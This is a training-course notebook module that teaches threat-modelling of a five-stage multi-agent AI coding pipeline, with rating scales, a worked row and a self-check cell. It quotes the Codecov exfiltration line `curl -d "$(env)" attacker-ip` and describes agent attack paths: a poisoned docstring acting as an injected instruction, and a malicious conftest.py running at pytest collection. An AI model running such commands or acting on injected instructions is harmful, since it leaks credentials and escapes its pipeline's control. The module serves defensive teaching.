# Day 2 · Module 1: Threat Model

**Objective:** threat-model a multi-agent pipeline — rate each stage's risks by likelihood × impact, and assign each one a control requirement. The headline lesson is transitive reach: a capability that reaches further than its stage's direct action suggests.


## 1 · The idea

A threat model for an agentic pipeline is a table: one row per stage, per capability that stage has. For each row you rate likelihood and impact, then route it to a control with one heuristic:

> **impossible → prevent · needs a human → gate · only observable after → detect · tolerable → accept**

Reach for the leftmost control the row allows, and only drop right when the one to its left is genuinely infeasible. "Prevent" means the action is made impossible, not that the model was asked nicely not to do it.

Most of the table is straightforward once you list out what each stage can literally do. The hard part — and the point of this module — is **transitive reach**: a stage's capability often grants more power than its stated action implies, because of what that action pulls in behind it.


### Grounding & real-world context

This pipeline teaches vulnerability patterns from a real 2024 supply-chain attack: a CI runner was compromised via malicious code in a test fixture. The attacker injected code into `tests/conftest.py`, which ran during pytest's collection phase (before any assertion), and exfiltrated deployment credentials from the runner's environment.

The three transitive-reach patterns we model here map to real attack shapes:
1. **Tester/pytest import-time execution** — code in `tests/` runs before assertions
2. **Explorer/docstring injection** — a poisoned comment becomes trusted instruction
3. **Synthesizer/artifact trust** — downstream stage believes upstream output

ContosoBank's Day 1 capstone pipeline has five stages: explorer, implementer, tester, critic, synthesizer, run against the transfers / ledger / holds feature set. Read the full description of each stage's tools, untrusted inputs, and reach at `reference/day2/m1/pipeline.md` — that reference includes real-world payload examples and threat rating scales.

### Real-world transitive reach — four supply-chain attacks

Before you build your own threat model, study how transitive reach showed up in four documented attacks. Each row below shows:
- **What the stage's stated action was** (build, read, approve, run)
- **What its transitive reach actually was** (compromised all customers, leaked all secrets, infected critical services)

#### 1. SolarWinds / SUNBURST (2020) — Build → Binary poisoning
- **Stage:** Build system
- **Stated action:** Compile source, create binary, sign with private key
- **Transitive reach:** Code injected at compile time (not in source control), deleted post-build, shipped in signed binary. ~18,000 customers pulled trojanized Orion updates. Build access reached transitively to **all downstream customers**.

#### 2. XZ Utils Backdoor (CVE-2024-3094, March 2024) — Maintainer → Transitive dependency chain
- **Stage:** Source maintainer
- **Stated action:** Approve commits, maintain the liblzma library
- **Transitive reach:** Backdoor embedded in binary test files (invisible in source diffs). When sshd links to systemd, which links to liblzma, the backdoor loaded into SSH. One library compromise reached transitively into **critical services that never directly depended on it**.

#### 3. 3CX Installers (March 2023) — Developer account → Global artifact poisoning
- **Stage:** Developer with build-system access
- **Stated action:** Build and sign installers
- **Transitive reach:** One compromised account poisoned both Windows and macOS builds. Signed with legitimate 3CX certificates. Reached transitively to **all customers trusting 3CX's signature**.

#### 4. Codecov Bash Uploader (April 2021) — Tool reads environment, exfiltrates
- **Stage:** CI tool (reads env to configure itself)
- **Stated action:** Read environment variables for API keys, repo identity
- **Transitive reach:** Malicious line added: `curl -d "$(env)" attacker-ip`. Tool read environment *and exfiltrated it*. For 61 days, 23,000+ customers leaked **all secrets in their build environment**.

**Core principle:** Each stage's stated action (build, approve, read, sign) understates its transitive reach (affects all customers, all dependent services, all secrets in the environment).

When you threat-model, don't just list what each stage's tools *say they do*. Ask: where does this stage's reach **actually go**, once you follow the chain?

### A fully-rated worked row

Before you fill in your own table, walk through one row rated end to end. This is the tester/pytest mechanism from the grounding above, rated and routed through the heuristic:

| Stage | Capability | Likelihood | Impact | Control |
|---|---|---|---|---|
| Tester | `uv run pytest` collection imports `tests/` (`conftest.py` first, then each test module) as Python code → arbitrary import-time execution | High — any file under `tests/` runs at collection time; there is no review gate on test code before the tester's turn | High — runs with the tester's full reach: ledger, filesystem, network | **prevent** |

**Walk the heuristic aloud, in order:** can this be made impossible? Yes — collect in a network-blocked sandbox and forbid import-time side effects in `tests/`, and the risk is structurally gone before the tester ever starts. Because "impossible" is reachable, the row stops at **prevent** and never reaches "does it need a human" (gate) or "can we only see it after" (detect). Reaching for detect here — "we'll notice in the logs that `conftest.py` phoned home" — would be settling for the second-leftmost control when the leftmost one was available. Treat `tests/` as code-under-review, the same as `src/`, not as trusted input just because it has "test" in the name.


### Setup check

Run the cell below once per session. It makes sure `contoso` is importable and prints the resolved project root — you'll need `proj` later for the self-check.


In [ ]:
import subprocess, sys, os
# Ensure src is importable and the sandbox is healthy before you start.
os.chdir(os.path.dirname(os.getcwd())) if os.path.basename(os.getcwd()) in ("day1","day2") else None
root = subprocess.run(["git","rev-parse","--show-toplevel"], capture_output=True, text=True)
proj = root.stdout.strip() or os.path.abspath(os.path.join(os.getcwd(), "..", ".."))
sys.path.insert(0, os.path.join(proj, "src"))
print("project root:", proj)
try:
    import contoso
    print("contoso imported OK")
except Exception as e:
    print("Could not import contoso:", e)
    print("Run `uv sync` in the repo root, then restart the kernel.")


## 2 · Your exercise

Work through these steps in order:

1. Read `reference/day2/m1/pipeline.md` in full. It describes all five stages' tools, untrusted inputs, and reach — do not threat-model from memory of Day 1.
2. Fill in `templates/threat-model.md`: one row per stage × capability. For each row, rate likelihood and impact, and route it to a control with the heuristic — impossible → prevent, needs a human → gate, only observable after → detect, tolerable → accept.
3. Name at least one transitive-reach risk beyond the tester/pytest row above (the explorer's poisoned docstring is one candidate; there is at least one more if you look at how the synthesizer treats earlier stages' artifacts as trusted input).
4. Extract a top-5 **ordered** hardening backlog from your table, where *ordered* means sorted by **likelihood × impact × ease-of-mitigation** — not likelihood × impact alone, which buries the cheap wins behind the merely-scary ones. Write the completed table plus the backlog to `artifacts/day2/m1/threat-model.md`.


### Threat rating scales

Use these scales to rate likelihood and impact for each row:

**Likelihood:** How often does this stage run, and can the attacker influence the untrusted input?
- **High (9-10):** Stage runs on every pipeline execution; attacker controls files (e.g., implementer writes to `src/` and `tests/`)
- **Medium (5-8):** Stage runs regularly but attacker influence requires a specific code path or commit (e.g., explorer reads a docstring only if that module is touched)
- **Low (1-4):** Stage runs infrequently, or attacker control is hypothetical (e.g., requires multiple prior compromises)

**Impact:** What reach does this stage have if compromised?
- **High (9-10):** Network access, filesystem access, environment variables with credentials, ability to exfiltrate data or ship code to production
- **Medium (5-8):** Can delay/block features, pollute logs, read protected codebase sections, create noise in artifacts
- **Low (1-4):** Cosmetic changes, noise, information already public

**Examples from the reference:**
- Tester running `conftest.py` payload: Likelihood = High (implementer controls `tests/`), Impact = High (runs with CI env vars)
- Explorer reading poisoned docstring: Likelihood = Medium (docstring must exist and be read), Impact = High (if downstream stage executes the injected instruction)

### What good looks like

A strong threat model covers at least 4 of the 5 pipeline stages, names at least one risk explicitly as transitive reach (not just "tester runs code" but the specific mechanism — pytest collection importing `conftest.py` first, then every module under `tests/`, reaching whatever the implementer wrote) plus a second candidate (the explorer's poisoned docstring, or another you found), assigns at least one row a "prevent" control via the heuristic, and ends with a genuine top-5 backlog ordered by likelihood × impact × ease-of-mitigation rather than a restatement of the table.

Common failure modes:
- Modeling only each stage's direct, stated action and missing what that action transitively pulls in.
- Rating every row "detect" because it feels safer than committing to a harder call — some rows genuinely need "prevent," and the heuristic tells you which.
- Sorting the backlog by likelihood × impact alone, which buries a cheap, high-value fix behind an equally-scary but expensive one.
- Skipping the backlog, or listing five items that are not actually ordered by any stated rule.


### Verify your work

This checklist is advisory, not a gate — it just reflects back what it finds in `artifacts/day2/m1/`. Run it any time; it's safe to run before you've written anything.


In [ ]:
import pathlib
tm = pathlib.Path(proj) / "artifacts" / "day2" / "m1" / "threat-model.md"
if tm.exists():
    t = tm.read_text().lower()
    print(f"[x] threat-model.md present ({len(t.split())} words)")
    stages = [s for s in ("explorer","implementer","tester","critic","synthesizer") if s in t]
    print(f"  [{'x' if len(stages) >= 4 else ' '}] covers >=4/5 stages ({len(stages)}/5)")
    print(f"  [{'x' if 'transitive' in t or 'imports' in t or 'via the tester' in t or 'arbitrary code' in t or 'conftest' in t else ' '}] names transitive reach (conftest.py / pytest collection, or the explorer's docstring)?")
    print(f"  [{'x' if 'prevent' in t else ' '}] uses a 'prevent' control rating?")
    print(f"  [{'x' if 'ease' in t or 'ease-of-mitigation' in t or 'backlog' in t else ' '}] has an ordered hardening backlog (L x I x ease-of-mitigation)?")
else:
    print("[ ] artifacts/day2/m1/threat-model.md missing — fill it from templates/threat-model.md")


## 3 · Debrief

- Where in this pipeline does a stage's reach exceed its direct, stated action? Transitive reach through pytest collection (`conftest.py` first) is one instance, the explorer's poisoned docstring is a second — are there others? (The synthesizer treating every prior artifact as trusted input is a third, if nobody names it.)
- Which risks in your table absolutely must be *prevented*, versus which ones are acceptable to merely *detect* after the fact? Run the heuristic out loud on a disputed row: is it really impossible to prevent, or did the table just settle for detect because it was easier to write down?
- Two rows can share the same likelihood × impact and still deserve different backlog positions — what does *ease-of-mitigation* change about which one your team should fix first?


---
### Take-home

Rating a stage by its stated action alone understates its real risk. The transitive-reach lesson generalizes: whenever one stage's output becomes another stage's input — especially code that gets imported, executed, or otherwise interpreted — the reach of the earlier stage is really the reach of whatever the later stage's own capability set allows.

(Related concept: permissions turn a "prevent" row into an enforced control, rather than a documented intention.)
